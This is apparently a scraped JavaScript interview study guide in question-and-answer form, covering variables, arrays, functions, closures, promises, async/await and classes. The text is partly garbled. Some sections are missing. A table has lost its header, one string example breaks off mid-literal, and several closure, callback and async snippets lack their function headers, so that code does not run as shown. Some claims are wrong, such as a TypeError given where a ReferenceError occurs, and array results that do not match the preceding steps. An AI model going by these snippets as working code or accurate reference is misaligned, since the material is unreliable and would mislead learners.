01 — Basics & Introduction
Q. What is JavaScript? What is the role of the JavaScript engine?
▾

JavaScript (JS) is a lightweight, interpreted programming language that runs in the browser (and on servers via Node.js). It makes web pages interactive — handling form validation, DOM manipulation, animations, API calls, and logic. It is the only language that all browsers run natively — HTML is structure, CSS is style, JS is behaviour.

JavaScript Engine

The JS Engine is a program inside the browser that reads, parses, compiles, and executes JavaScript code. Each browser has its own:

  • V8 — Chrome & Node.js (the fastest, uses JIT compilation)
  • SpiderMonkey — Firefox
  • JavaScriptCore (Nitro) — Safari

The engine: parses source code → builds an AST (Abstract Syntax Tree) → compiles to bytecode → JIT (Just-In-Time) compiles hot code paths to native machine code → executes. JIT makes JS almost as fast as compiled languages.

02 — Variables & Datatypes
Q. What are variables? What is the difference between var, let, and const?
▾

A variable is a named container that stores a value in memory. You declare variables in JS using var, let, or const. Each behaves differently in scope, hoisting, and re-assignment.

ScopeFunction scopedBlock scoped {}Block scoped {}
HoistingHoisted → undefinedHoisted but in TDZ ❌Hoisted but in TDZ ❌

var name = 'Rahul';     // old — avoid, causes scope bugs
let age = 25;           // use when value needs to change
const PI = 3.14;        // use when value should never change

// Block scope demo
if (true) {
  var   x = 10;  // leaks OUT of the block
  let   y = 20;  // stays INSIDE the block

}
console.log(x); // 10 ✅
console.log(y); // ReferenceError ❌
console.log(z); // ReferenceError ❌
💡 TDZ = Temporal Dead Zone. let and const are hoisted but NOT initialised — accessing them before declaration throws a ReferenceError, which is much safer than var's silent undefined.
Q. What are data types in JS? What is the difference between primitive and non-primitive data types?
▾
// ── PRIMITIVE (7 types) ──────────────────────────────
// Stored by VALUE. Immutable. Copied when assigned.
let str  = "Hello";          // String
let num  = 42;               // Number  (int + float together)
let bool = true;             // Boolean
let nil  = null;             // Null    — intentional empty value
let undef = undefined;       // Undefined — declared but not assigned
let sym  = Symbol('id');    // Symbol  — unique identifier
let big  = 9007199254740991n; // BigInt  — very large integers

// ── NON-PRIMITIVE ─────────────────────────────────────
// Stored by REFERENCE. Mutable. Variables point to same object.
let obj = { name: 'Rahul', age: 25 }; // Object
let arr = [1, 2, 3];                  // Array (special object)
let fn  = function() {};               // Function (special object)

// Reference behaviour — both point to SAME object
let a = { x: 1 };
let b = a;
b.x = 99;
console.log(a.x); // 99 — a was also changed!
💡 Key difference: If you copy a primitive (let b = a), you get an independent copy. If you copy a non-primitive, both variables point to the same object in memory — changing one changes the other.

03 — Operators & Conditions
Q. What are operators? What are the types of operators in JS?
▾

An operator is a symbol that performs an operation on one or more values (operands) and produces a result.

// 1. Arithmetic operators
5 + 3   // 8  (addition)
5 - 3   // 2  (subtraction)
5 * 3   // 15 (multiplication)
5 / 2   // 2.5 (division)
5 % 2   // 1  (modulus — remainder)
2 ** 3  // 8  (exponentiation)
x++     // post-increment (return then add)
++x     // pre-increment (add then return)

// 2. Assignment operators
x = 10;  x += 5;  x -= 2;  x *= 3;  x /= 2;  x **= 2;

// 3. Comparison operators
5 == "5"    // true  — loose equality (coerces types)
5 === "5"   // false — strict equality (checks type too) ← always use this
5 != 3      // true
5 !== "5"   // true
5 > 3       // true
5 >= 5      // true

// 4. Logical operators
true && false   // false (AND — both must be true)
true || false   // true  (OR  — at least one must be true)
!true           // false (NOT — flips the boolean)

// 5. Ternary operator
const msg = age >= 18 ? 'Adult' : 'Minor';

// 6. Nullish coalescing (??)
const name = user ?? 'Guest'; // 'Guest' only if user is null or undefined

// 7. Optional chaining (?.)
user?.address?.city   // no error if user or address is undefined
Q. What is the difference between unary, binary, and ternary operators?
▾
// UNARY — operates on ONE operand
typeof x        // checks type of x
!true           // negates — false
-5              // negates number — -5
x++             // increments x by 1
delete obj.key  // deletes a property

// BINARY — operates on TWO operands
5 + 3           // 8
10 > 3          // true
a && b          // logical AND

// TERNARY — operates on THREE operands
// condition ? valueIfTrue : valueIfFalse
const status = score >= 50 ? 'Pass' : 'Fail';
// Nested ternary (use sparingly — gets unreadable)
const grade = score >= 90 ? 'A' : score >= 70 ? 'B' : 'C';
Q. What is short-circuit evaluation in JS?
▾

Short-circuit evaluation means JS stops evaluating an expression as soon as the result is determined — without running the rest. Very useful for defaults and conditional execution.

// && (AND) — stops at first FALSY value
false && doSomething()   // doSomething never runs!
true  && doSomething()   // doSomething runs ✅
// Practical use: conditional rendering
isLoggedIn && showDashboard();

// || (OR) — stops at first TRUTHY value
true  || doSomething()   // doSomething never runs!
false || doSomething()   // doSomething runs ✅
// Practical use: default values
const username = userInput || 'Guest';  // 'Guest' if userInput is falsy

// ?? (Nullish coalescing) — only stops at null/undefined
const count = userCount ?? 0;  // 0 if userCount is null/undefined
// Difference: 0 || 'default' = 'default' (0 is falsy)
//             0 ?? 'default' = 0         (0 is not null/undefined)
✅ Use || for general fallbacks. Use ?? when 0, false, or "" are valid values you want to keep.
Q. What is operator precedence?
▾

Operator precedence determines the order in which operators are evaluated when multiple operators appear in the same expression. Higher precedence runs first — just like BODMAS in maths.

// Without brackets — precedence decides the order
2 + 3 * 4      // 14 — * has higher precedence than +
(2 + 3) * 4    // 20 — brackets override precedence

// Precedence order (highest → lowest, simplified)
// 1. ()  — grouping / function call
// 2. **  — exponentiation
// 3. * / %  — multiplication, division, modulus
// 4. + -    — addition, subtraction
// 5. > >= < <= — comparison
// 6. == === != !== — equality
// 7. &&  — logical AND
// 8. ||  — logical OR
// 9. =   — assignment (lowest)

// Real example
let result = 5 + 3 > 6 && 2 * 2 === 4;
// Step 1: 2 * 2 = 4
// Step 2: 5 + 3 = 8
// Step 3: 8 > 6 = true
// Step 4: 4 === 4 = true
// Step 5: true && true = true
Q. What are the types of conditional statements in JS? When to use which?
▾
// 1. if / else if / else — use for RANGE checks or complex conditions
if (score >= 90) {
  console.log('A grade');
} else if (score >= 70) {
  console.log('B grade');
} else {
  console.log('C grade');
}

// 2. switch — use for EXACT VALUE matching (cleaner than many else-ifs)
switch (day) {
  case 'Mon': console.log('Monday'); break;
  case 'Fri': console.log('Friday'); break;
  default:    console.log('Other day');
} // always use break! Without it, cases fall through into each other.

// 3. Ternary — use for SIMPLE yes/no in one line
const label = isAdmin ? 'Admin' : 'User';

// 4. Nullish coalescing (??) — only replaces null/undefined
const displayName = user.name ?? 'Anonymous';
✅ Rule of thumb: use if/else for complex logic with ranges. Use switch when matching one variable against many fixed values. Use ternary for simple conditional assignments. Use ?? for null/undefined fallbacks.
Q. What is the difference between == and ===? What is the difference between Spread and Rest operator?
▾
// == (loose equality) — converts types before comparing
5    == "5"   // true  — "5" becomes 5
0    == false // true  — false becomes 0
null == undefined // true — special case

// === (strict equality) — checks VALUE and TYPE, no conversion
5    === "5"   // false — number !== string
0    === false // false — number !== boolean
null === undefined // false

// Always use === in real code to avoid unexpected bugs!

// ── SPREAD (...) — expands / spreads out an array or object ──
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5];   // [1, 2, 3, 4, 5]
const copy = [...arr1];          // shallow copy of array

const obj1 = { a: 1, b: 2 };
const obj2 = { ...obj1, c: 3 }; // { a: 1, b: 2, c: 3 }

Math.max(...[3, 1, 9]);         // 9 — spread into function args

// ── REST (...) — collects remaining arguments into an array ──
function sum(first, ...rest) {   // rest = all args after first
  console.log(first);           // 1
  console.log(rest);            // [2, 3, 4, 5]
  return rest.reduce((a, b) => a + b, first);
}
sum(1, 2, 3, 4, 5);  // 15
💡 Same ... symbol, different context: Spread unpacks/expands (used in assignments, function calls). Rest packs/collects (used in function parameter definitions).
04 — Arrays
Q. What are Arrays in JS? How to get, add & remove elements from arrays?
▾

An Array is an ordered collection of values (elements) stored in a single variable. Elements are accessed by their index (starting at 0). Arrays can hold any data type — numbers, strings, objects, even other arrays.

const fruits = ['apple', 'banana', 'mango'];

// ── GET ──────────────────────────────────────────────
fruits[0]          // 'apple'   (first element)
fruits[2]          // 'mango'   (last element here)
fruits.length      // 3
fruits.at(-1)      // 'mango'   (last element, modern)

// ── ADD ──────────────────────────────────────────────
fruits.push('grape')     // add to END   → ['apple','banana','mango','grape']
fruits.unshift('kiwi')  // add to START → ['kiwi','apple','banana','mango']

// ── REMOVE ───────────────────────────────────────────
fruits.pop()    // remove from END   → returns 'mango'
fruits.shift()  // remove from START → returns 'apple'
Q. indexOf? find() vs filter()? slice()? pop() vs shift()? splice()? slice() vs splice()? map() vs forEach()? sort/reverse? Destructuring? Array-like objects? Convert array-like to array?
▾
const nums = [5, 12, 8, 130, 44];

// indexOf — returns INDEX of element (-1 if not found)
nums.indexOf(8)       // 2
nums.indexOf(99)      // -1
nums.includes(8)      // true (cleaner check for existence)

// find() — returns FIRST MATCHING ELEMENT (not index), or undefined
nums.find(n => n > 10)     // 12 (stops at first match)

// filter() — returns NEW ARRAY of ALL matching elements
nums.filter(n => n > 10)   // [12, 130, 44]

// slice(start, end) — returns portion as NEW array, original unchanged
nums.slice(1, 3)          // [12, 8] (index 1 up to NOT including 3)
nums.slice(2)             // [8, 130, 44] (from index 2 to end)
nums.slice(-2)            // [130, 44] (last 2 elements)

// splice(start, deleteCount, ...items) — MODIFIES original array
const a = [1, 2, 3, 4];
a.splice(1, 2)              // removes 2 items at index 1 → a = [1, 4]
a.splice(1, 0, 'X', 'Y')   // inserts 'X','Y' at index 1, removes 0
a.splice(1, 1, 'Z')         // replaces 1 item at index 1 with 'Z'

// map() — transforms EVERY element, returns NEW array (never changes original)
nums.map(n => n * 2)       // [10, 24, 16, 260, 88]
nums.map(n => n + '!')     // ['5!', '12!', '8!', '130!', '44!']

// forEach() — loops through array, returns UNDEFINED (used for side effects)
nums.forEach((n, i) => console.log(i, n)); // 0 5, 1 12 etc.

// sort — SORTS IN PLACE (modifies original!)
[3,1,4,1,5].sort((a, b) => a - b)  // [1,1,3,4,5] ascending
[3,1,4].sort((a, b) => b - a)      // [4,3,1] descending
['banana','apple'].sort()           // ['apple','banana'] alphabetical

// reverse — reverses in place
[1,2,3].reverse()  // [3,2,1]

// Array Destructuring
const [first, second, ...rest] = [10, 20, 30, 40];
// first=10, second=20, rest=[30,40]
const [,, third] = [1, 2, 3]; // third=3 (skip first two)

// Array-like objects — have .length and indexed items, but not real arrays
// Examples: NodeList (querySelectorAll), arguments object, strings
const nodes = document.querySelectorAll('p'); // NodeList — NOT an array
nodes.map(() => {});  // ❌ TypeError: nodes.map is not a function

// Convert array-like to real array (3 ways)
const arr1 = Array.from(nodes);    // ✅ preferred
const arr2 = [...nodes];           // ✅ spread
const arr3 = Array.prototype.slice.call(nodes); // old way
💡 splice vs slice: splice = surgery on original array. slice = take a clean copy of a portion. map vs forEach: map gives you a new array; forEach gives you nothing — it's only for running side effects.
05 — Loops
Q. What is a loop? Types of loops? while vs for? while vs do-while? break vs continue? for...of vs for loop? for...of vs for...in? forEach vs for...of? When to use which?
▾

A loop repeats a block of code multiple times, either for a set number of iterations or until a condition is met.

// 1. for — best when you KNOW how many times to loop
for (let i = 0; i < 5; i++) {
  console.log(i); // 0 1 2 3 4
}

// 2. while — best when condition drives the loop (unknown iterations)
let i = 0;
while (i < 5) {
  console.log(i);
  i++;
}

// 3. do...while — runs AT LEAST ONCE before checking condition
let count = 10;
do {
  console.log('runs once even though count is 10');
  count++;
} while (count < 5);  // condition is false but body ran once

// 4. for...of — iterates VALUES of iterable (array, string, Set, Map)
const colors = ['red', 'green', 'blue'];
for (const color of colors) {
  console.log(color); // red, green, blue
}
// Strings too!
for (const char of 'hello') console.log(char); // h e l l o

// 5. for...in — iterates KEYS of an object
const person = { name: 'Rahul', age: 25, city: 'Indore' };
for (const key in person) {
  console.log(key, person[key]); // name Rahul, age 25, city Indore
}
// ⚠️ Don't use for...in on arrays — use for...of or forEach instead

// 6. forEach — array method, index + value available
colors.forEach((color, index) => {
  console.log(index, color);
});
// ⚠️ Cannot use break, continue, or return to exit forEach early

// break — exits loop completely
for (let i = 0; i < 10; i++) {
  if (i === 5) break;   // stops at 5, never reaches 6-9
  console.log(i);        // 0 1 2 3 4
}

// continue — skips current iteration, continues with next
for (let i = 0; i < 6; i++) {
  if (i % 2 === 0) continue;  // skip even numbers
  console.log(i);               // 1 3 5
}
✅ When to use which: Use for...of to loop through array values. Use for...in to loop through object keys. Use forEach when you also need the index. Use regular for when you need to break early or need full control over iteration.
06 — Functions
Q. What are Functions in JS? What are the types of functions? Named vs Anonymous? When to use which?
▾

A function is a reusable block of code that performs a specific task. It is defined once and can be called/executed as many times as needed. Functions are first-class citizens in JS — they can be stored in variables, passed as arguments, and returned from other functions.

// 1. Named Function Declaration
// Fully hoisted — can be called BEFORE it's defined in the code
function greet(name) {
  return `Hello, ${name}!`;
}
greet('Rahul');  // 'Hello, Rahul!'

// 2. Anonymous Function (no name) — stored in a variable
const greet = function(name) {
  return `Hello, ${name}!`;
};
// NOT hoisted — must be defined before calling

// 3. Named Function Expression
const greet = function greetFn(name) {
  return `Hello, ${name}!`;
  // greetFn is only accessible INSIDE the function itself (useful for recursion)
};
✅ When to use named vs anonymous: Use named declarations for main functions you want to call from anywhere. Use anonymous/expression functions when assigning to variables, passing as callbacks, or when hoisting isn't needed.
Q. What is a function expression in JS?
▾

A function expression is a function assigned to a variable. Unlike function declarations, they are NOT hoisted — so you must define them before calling them.

// Function expression — assigned to a variable
const square = function(n) {
  return n * n;
};
square(4);  // 16

// Used as callback
const double = function(n) { return n * 2; };
[1, 2, 3].map(double);  // [2, 4, 6]

// IIFE — Immediately Invoked Function Expression
// Runs immediately, creates its own scope (used to avoid polluting global)
(function() {
  const secret = 'hidden';
  console.log('I run immediately!');
})();
Q. What are Arrow Functions in JS? What is their use?
▾

Arrow functions (introduced in ES6) are a shorter syntax for writing functions. Key difference: they do NOT have their own this — they inherit this from the surrounding lexical scope.

// Traditional function
function add(a, b) { return a + b; }

// Arrow function — same thing, shorter
const add = (a, b) => a + b;

// If only ONE parameter — no parentheses needed
const square = n => n * n;

// If body has multiple lines — use {} and return
const greet = (name) => {
  const msg = `Hello, ${name}`;
  return msg;
};

// 'this' difference — the key reason arrow functions exist
const timer = {
  seconds: 0,

  // Regular function — 'this' is lost inside setInterval
  startBroken: function() {
    setInterval(function() {
      this.seconds++;  // ❌ 'this' is undefined or window
    }, 1000);
  },

  // Arrow function — 'this' inherited from timer object ✅
  startFixed: function() {
    setInterval(() => {
      this.seconds++;  // ✅ 'this' is the timer object
    }, 1000);
  }
};
💡 Don't use arrow functions as object methods or constructors — they won't have a proper this. Use them for callbacks, array methods, and short utility functions.
Q. What are Callback Functions? What is their use?
▾

A callback function is a function passed as an argument to another function, to be executed later — either immediately or after some async event completes.

// Basic callback
function doTask(taskName, callback) {
  console.log(`Starting: ${taskName}`);
  callback();  // execute the callback
}
doTask('Build website', () => console.log('Task done!'));

// Callback with data returned
function calculate(a, b, operation) {
  return operation(a, b);
}
calculate(10, 5, (a, b) => a + b);  // 15 (add)
calculate(10, 5, (a, b) => a * b);  // 50 (multiply)

// Callbacks in built-in methods
[1, 2, 3].map(n => n * 2);           // callback: n => n * 2
[4, 2, 7].filter(n => n > 3);        // callback: n => n > 3
setTimeout(() => alert('Hi!'), 3000); // callback: () => alert('Hi!')
Q. What is a Higher-order function in JS?
▾

A Higher-order function (HOF) is a function that either takes another function as an argument, returns a function, or both. This makes code more reusable and composable.

// HOF that TAKES a function (like map, filter, reduce)
function applyTwice(fn, value) {
  return fn(fn(value));
}
applyTwice(x => x * 2, 3);  // 12 (3*2=6, 6*2=12)
applyTwice(x => x + 10, 5); // 25 (5+10=15, 15+10=25)

// HOF that RETURNS a function (factory pattern)
function multiplier(factor) {
  return (number) => number * factor;  // returns a new function
}
const double = multiplier(2);
const triple = multiplier(3);
double(5);   // 10
triple(5);   // 15

// Built-in HOFs you use every day
[1,2,3].map(fn)      // HOF — takes a function
[1,2,3].filter(fn)   // HOF — takes a function
[1,2,3].reduce(fn)   // HOF — takes a function
Q. What is the difference between arguments and parameters? In how many ways can you pass arguments to a function? How do you use default parameters?
▾
// PARAMETERS — placeholders in the function definition
function add(a, b) {    // a, b are PARAMETERS
  return a + b;
}
add(3, 5);             // 3, 5 are ARGUMENTS (real values passed)

// 3 ways to pass arguments
add(3, 5);                         // 1. Direct values
const args = [3, 5];
add(...args);                       // 2. Spread from array
add.apply(null, args);             // 3. Using .apply()

// Default parameters — used when argument is not passed (or is undefined)
function greet(name = 'Guest', age = 0) {
  return `Hello ${name}, age ${age}`;
}
greet();                   // 'Hello Guest, age 0'
greet('Rahul');            // 'Hello Rahul, age 0'
greet('Rahul', 25);       // 'Hello Rahul, age 25'
greet(undefined, 25);    // 'Hello Guest, age 25' — undefined triggers default
greet(null, 25);          // 'Hello null, age 25'  — null does NOT trigger default
Q. What is the use of event handling in JS? What are First-Class functions? Pure vs Impure functions? Function Currying? call, apply and bind?
▾
// EVENT HANDLING — responding to user/browser actions
document.getElementById('btn').addEventListener('click', function(e) {
  console.log('Button clicked!', e.target);
});

// FIRST-CLASS FUNCTIONS — functions treated like any other value
const fn = function() {};    // store in variable
doSomething(fn);              // pass as argument
function getGreeter() { return () => 'Hi'; }  // return as value

// PURE FUNCTION — same input ALWAYS gives same output, no side effects
const add = (a, b) => a + b;  // pure ✅ — predictable, easy to test

// IMPURE FUNCTION — depends on or changes external state
let total = 0;
const addToTotal = (n) => { total += n; return total; };  // impure ❌

// CURRYING — converts f(a, b, c) into f(a)(b)(c)
// Each call returns a new function waiting for the next argument
const curry = (a) => (b) => (c) => a + b + c;
curry(1)(2)(3);  // 6

// Real use: pre-configure functions
const add5 = curry(5);      // pre-filled with 5
add5(3)(2);               // 10

// CALL — invoke with specific 'this', args passed one by one
const user = { name: 'Rahul' };
function introduce(city, country) {
  return `${this.name} from ${city}, ${country}`;
}
introduce.call(user, 'Indore', 'India');     // 'Rahul from Indore, India'

// APPLY — same as call but args passed as ARRAY
introduce.apply(user, ['Indore', 'India']);  // 'Rahul from Indore, India'

// BIND — returns a NEW FUNCTION with 'this' permanently set
const boundFn = introduce.bind(user, 'Indore');
boundFn('India');  // 'Rahul from Indore, India' — can call later
💡 call vs apply vs bind: call and apply invoke immediately. bind returns a new function you can call later. call takes args individually, apply takes an array of args.
07 — Strings
Q. What is a String? Template literals & string interpolation? Single vs double quotes vs backticks? Important string methods? String immutability? String concatenation?
▾

A String is a sequence of characters used to represent text. Strings are immutable in JS — once created, the string itself cannot be changed. String methods return NEW strings rather than modifying the original.

// 3 ways to define strings
let s1 = 'Single quotes';   // single — most common
let s2 = "Double quotes";   // double — same as single
let s3 = `Backtick`;        // template literal — most powerful

// Template literals — expressions + multiline support
const name = 'Rahul';
const age = 25;
const msg = `Hello, ${name}! You are ${age} years old.`;
const expr = `2 + 2 = ${2 + 2}`;   // expressions work!
const multi = `Line 1

09 — Error Handling
Q. What is Error Handling in JS? finally block? throw statement? Error propagation? Best practices? Types of errors?
▾

Error handling is the process of gracefully managing errors that occur during code execution — preventing the entire program from crashing and giving the user (or developer) meaningful feedback.

// try-catch-finally structure
try {
  // Code that might throw an error
  const data = JSON.parse('this is not valid JSON'); // throws SyntaxError
  console.log(data.name); // this line never runs if error above
} catch (error) {
  console.error(error.name);    // 'SyntaxError'
  console.error(error.message); // 'Unexpected token...'
  console.error(error.stack);   // full stack trace for debugging
} finally {
  // ALWAYS runs — whether error occurred or not
  // Perfect for cleanup: hide loading spinners, close DB connections
  console.log('Cleanup complete');
  hideSpinner();  // will always run ✅
}

// throw — create and throw your own custom error
function divide(a, b) {
  if (b === 0) {
    throw new Error('Division by zero is not allowed');
  }
  return a / b;
}

try {
  divide(10, 0);
} catch(e) {
  console.log(e.message); // 'Division by zero is not allowed'
}

// ERROR PROPAGATION — errors bubble up the call stack until caught
function step3() { throw new Error('Error in step 3'); }
function step2() { step3(); }  // not caught here, propagates up
function step1() { step2(); }  // not caught here, propagates up
try {
  step1();  // error finally caught here
} catch(e) {
  console.log('Caught at top level:', e.message);
}

Types of Errors in JS

  • SyntaxError: Code cannot be parsed — let = 5, missing brackets
  • ReferenceError: Variable doesn't exist — console.log(xyz)
  • TypeError: Wrong type for operation — null.name, calling non-function
  • RangeError: Value out of allowed range — new Array(-1)
  • URIError: Malformed URI encoding — decodeURIComponent('%')
  • EvalError: Issues with the eval() function

Best Practices for Error Handling

  • Always wrap risky operations (JSON.parse, fetch, file read) in try-catch
  • Use meaningful error messages in throw statements
  • Use finally for cleanup code that must always run
  • Don't swallow errors silently (empty catch blocks)
  • Log errors properly — console.error() not console.log()

Q. What is Scope in JavaScript? What is Hoisting?
▾

Scope defines where a variable is accessible in your code. JS has three scope levels.

// 1. Global scope — accessible everywhere in the file
let globalVar = 'I am global';

function myFunction() {
  // 2. Function (local) scope — only accessible inside this function
  let funcVar = 'I am function-scoped';
  console.log(globalVar);  // ✅ can access global
  console.log(funcVar);    // ✅ can access local

  if (true) {
    // 3. Block scope — only accessible inside these {}
    let blockVar = 'I am block-scoped';
    console.log(blockVar);   // ✅ accessible inside block
  }
  console.log(blockVar);    // ❌ ReferenceError — out of scope
}
console.log(funcVar);      // ❌ ReferenceError — out of scope

// ── HOISTING ──────────────────────────────────────────
// JS moves declarations to the TOP of their scope before execution

// var — hoisted and initialised as undefined
console.log(x);   // undefined (no error!)
var x = 5;
console.log(x);   // 5

// Function declarations — fully hoisted (name AND body)
sayHello();       // 'Hello!' — works before declaration!
function sayHello() { console.log('Hello!'); }

// let and const — hoisted but NOT initialised (Temporal Dead Zone)
console.log(y);   // ❌ ReferenceError: Cannot access 'y' before initialization
let y = 10;

// Function expressions — NOT hoisted
greet();           // ❌ TypeError: greet is not a function
const greet = () => 'Hi';
Q. Explain Lexical Scoping. What is a Closure? Benefits? Encapsulation with closures? Disadvantages? Release closure memory? Closure vs Regular Function?
▾

Lexical Scoping means a function's scope is determined by where it is DEFINED in the code — not where it is CALLED. Inner functions can access variables from their outer (parent) functions, but not the other way around.

// Lexical scoping example
function outer() {
  let outerVar = 'I am outer';

  function inner() {
    // inner can access outerVar because of lexical scope
    console.log(outerVar);  // ✅ 'I am outer'
  }
  inner();
}

// ── CLOSURE ───────────────────────────────────────────
// A closure is when an inner function REMEMBERS variables from
// its outer scope even AFTER the outer function has finished executing.

function makeCounter() {
  let count = 0;  // this variable is "closed over"

  return {
    increment: () => { count++; return count; },
    decrement: () => { count--; return count; },
    reset:     () => { count = 0; },
    getCount:  () => count
  };
}

const counter = makeCounter();
// makeCounter has finished running but count is still alive in memory!
counter.increment();   // 1
counter.increment();   // 2
counter.increment();   // 3
counter.decrement();   // 2
counter.getCount();    // 2

// count is PRIVATE — cannot be accessed directly from outside
console.log(counter.count);  // undefined — encapsulated! ✅

// ── ENCAPSULATION with closures ───────────────────────
function createBankAccount(initialBalance) {
  let balance = initialBalance;  // private
  return {
    deposit: (amount) => { balance += amount; return balance; },
    withdraw: (amount) => {
      if (amount > balance) throw new Error('Insufficient funds');
      balance -= amount;
      return balance;
    },
    getBalance: () => balance
  };
}
const myAccount = createBankAccount(1000);
myAccount.deposit(500);    // 1500
myAccount.withdraw(200);  // 1300
// balance is completely private — no way to access it directly

Benefits of Closures

  • Data encapsulation / privacy: Variables inside are hidden from outside scope
  • State preservation: Variables persist between function calls
  • Factory functions: Create multiple independent instances with their own state
  • Memoization / caching: Cache expensive computation results

Disadvantages of Closures

  • Memory usage: Closed-over variables stay in memory as long as the closure exists
  • Memory leaks: If closures are never released, variables never get garbage collected
  • Debugging complexity: Harder to trace where a variable came from
// RELEASE closure memory — set to null when done

myCounter.increment();

function addRegular(a, b) { return a + b; }  // no memory of previous calls

add10(20);  // 30 — x=10 is still there

13 — Asynchronous Programming: Basics
Q. What is asynchronous programming in JS? What is its use?
▾

Asynchronous programming allows JavaScript to start a long-running task and move on to other work WITHOUT waiting for it to finish. When the task is done, JS comes back to handle the result. This is critical because JavaScript is single-threaded — it can only do one thing at a time. Without async, a slow network request would freeze the entire browser.

Why it's needed

  • Fetching data from an API (takes unpredictable time)
  • Reading files from disk (in Node.js)
  • Waiting for timers (setTimeout, setInterval)
  • User interactions — you don't know when the user will click
  • Database queries — takes time, can't block UI
// Without async (synchronous) — blocks everything
const data = fetchFromServer();  // ❌ browser freezes until done
console.log(data);

// With async — non-blocking, user can still interact
fetchFromServer().then(data => console.log(data)); // ✅ continues immediately
console.log('This runs BEFORE fetch completes');

Q. What is the role of callbacks in fetching API data asynchronously? What is callback hell? How can it be avoided?
▾

Callbacks were the original way to handle async operations — you pass a function that runs when the async task completes. For a single task this is fine, but when you need to chain multiple async tasks, it creates deeply nested code known as callback hell.

// Callbacks fetching API data

  setTimeout(() => callback({ id, name: 'Rahul' }), 1000);
}
getUser(1, (user) => console.log(user));

getUser(1, function(user) {
  getOrders(user.id, function(orders) {
    getProduct(orders[0].productId, function(product) {
      getReviews(product.id, function(reviews) {
        console.log(reviews);
        // ↑ deeply nested — hard to read, debug, maintain
      });
    });
  });
});

// ── HOW TO AVOID IT ──────────────────────────────────

// Option 1: Named functions (flatten the pyramid)
function handleUser(user) { getOrders(user.id, handleOrders); }
function handleOrders(orders) { getProduct(orders[0].productId, handleProduct); }
function handleProduct(product) { console.log(product); }
getUser(1, handleUser);  // clean flat structure

// Option 2: Promises (best — see next section)
getUser(1)
  .then(user => getOrders(user.id))
  .then(orders => getProduct(orders[0].productId))
  .then(product => console.log(product))
  .catch(err => console.error(err));

// Option 3: async/await (cleanest — see section 15)
async function loadData() {
  const user    = await getUser(1);
  const orders  = await getOrders(user.id);
  const product = await getProduct(orders[0].productId);
  console.log(product);
}
14 — Asynchronous Programming: Promises
Q. What are Promises in JavaScript? How to implement them? When to use them in real applications?
▾

A Promise is an object that represents the eventual result of an asynchronous operation. It has three states: pending (still waiting), fulfilled (success, resolved with a value), and rejected (failed, rejected with a reason). A Promise can only move from pending → fulfilled OR pending → rejected — never back.

// ── CREATING a Promise ────────────────────────────────
const myPromise = new Promise((resolve, reject) => {
  // Do the async work here
  const success = true;

  if (success) {
    resolve({ id: 1, name: 'Rahul' });  // fulfilled with data
  } else {
    reject(new Error('Something went wrong'));  // rejected with error
  }
});

// ── CONSUMING a Promise ───────────────────────────────
myPromise
  .then((data) => {
    console.log('Success:', data);   // runs if resolved
    return data.name;                  // pass data to next .then()
  })
  .then((name) => {
    console.log('Name:', name);       // chained .then()
  })
  .catch((error) => {
    console.error('Error:', error.message); // runs if rejected
  })
  .finally(() => {
    console.log('Always runs');      // success or fail
    hideLoadingSpinner();
  });

// ── Real-world example: fetching from an API ──────────
function fetchUser(id) {
  return fetch(`https://api.example.com/users/${id}`)
    .then(response => {
      if (!response.ok) throw new Error('User not found');

15 — Asynchronous Programming: Async/Await
Q. What is the purpose of async/await? Compare it with Promises. Explain the use of async and await keywords.
▾

async/await is syntactic sugar built on top of Promises (ES2017). It lets you write asynchronous code that looks and reads just like synchronous code — no more .then() chains. Under the hood, it still uses Promises.

// ── Same task: Promises vs async/await ───────────────

// WITH Promises — chain of .then()
function loadUserData() {
  return fetch('/api/user')
    .then(res => res.json())
    .then(user => fetch(`/api/orders/${user.id}`))
    .then(res => res.json())
    .then(orders => console.log(orders))
    .catch(err => console.error(err));
}

// WITH async/await — reads top to bottom like sync code
async function loadUserData() {
  try {
    const userRes  = await fetch('/api/user');     // pause, wait for response
    const user     = await userRes.json();           // pause, wait for parsing
    const ordersRes = await fetch(`/api/orders/${user.id}`);
    const orders   = await ordersRes.json();
    console.log(orders);
  } catch (err) {
    console.error(err);  // handles any error from any await above
  }
}

// ── What 'async' does ────────────────────────────────
// Makes the function return a Promise automatically

  return 'Hello';   // JS wraps this in Promise.resolve('Hello')
}

// Pauses execution of the async function until Promise settles
// Does NOT block the whole JS thread — other code can still run

17 — Classes, Constructors, this & Inheritance
Q. What are Classes in JS? What is a constructor? What are constructor functions? What is the use of the this keyword? Explain prototypal inheritance.
▾

A class is a blueprint/template for creating objects with shared properties and methods. Introduced in ES6, it's syntactic sugar over JavaScript's prototype-based inheritance — under the hood, classes still use prototypes.

// ── CLASS definition ──────────────────────────────────
class Person {
  // constructor — runs automatically when new Person() is called
  constructor(name, age) {
    this.name = name;   // 'this' = the new instance being created
    this.age  = age;
  }

  // Method — shared by all instances via the prototype
  greet() {
    return `Hi, I'm ${this.name} and I'm ${this.age} years old.`;
  }

  // Static method — called on the CLASS itself, not on instances
  static species() {
    return 'Homo sapiens';
  }
}

const rahul = new Person('Rahul', 25);
rahul.greet();         // "Hi, I'm Rahul and I'm 25 years old."
Person.species();      // "Homo sapiens" — called on class, not instance

// ── CONSTRUCTOR FUNCTION (old pre-ES6 way) ───────────
function Car(make, model) {
  this.make  = make;
  this.model = model;
}
Car.prototype.describe = function() {
  return `${this.make} ${this.model}`;
};
const myCar = new Car('Toyota', 'Corolla');
myCar.describe();  // "Toyota Corolla"

// ── 'this' keyword contexts ───────────────────────────
const obj = {
  name: 'Rahul',
  greet() { return this.name; }  // 'this' = the obj
};
function alone() { console.log(this); }   // 'this' = window (or undefined in strict)
const arrow = () => console.log(this);    // 'this' = outer (lexical) scope
new MyClass()   // 'this' = newly created instance

// ── INHERITANCE using extends ─────────────────────────
class Developer extends Person {
  constructor(name, age, language) {
    super(name, age);        // MUST call super() first — runs Person's constructor
    this.language = language;
  }

  greet() {                   // override parent's greet()
    return `${super.greet()} I code in ${this.language}.`;
  }

  code() { return `${this.name} is coding...`; }
}

const dev = new Developer('Rahul', 25, 'JavaScript');
dev.greet();    // "Hi, I'm Rahul... I code in JavaScript."
dev.code();     // "Rahul is coding..."

// ── PROTOTYPAL INHERITANCE ────────────────────────────
// JS inherits through a prototype chain, not copying
dev instanceof Developer  // true
dev instanceof Person     // true  — Developer inherits Person's prototype
dev.__proto__ === Developer.prototype   // true
Developer.prototype.__proto__ === Person.prototype  // true — the chain
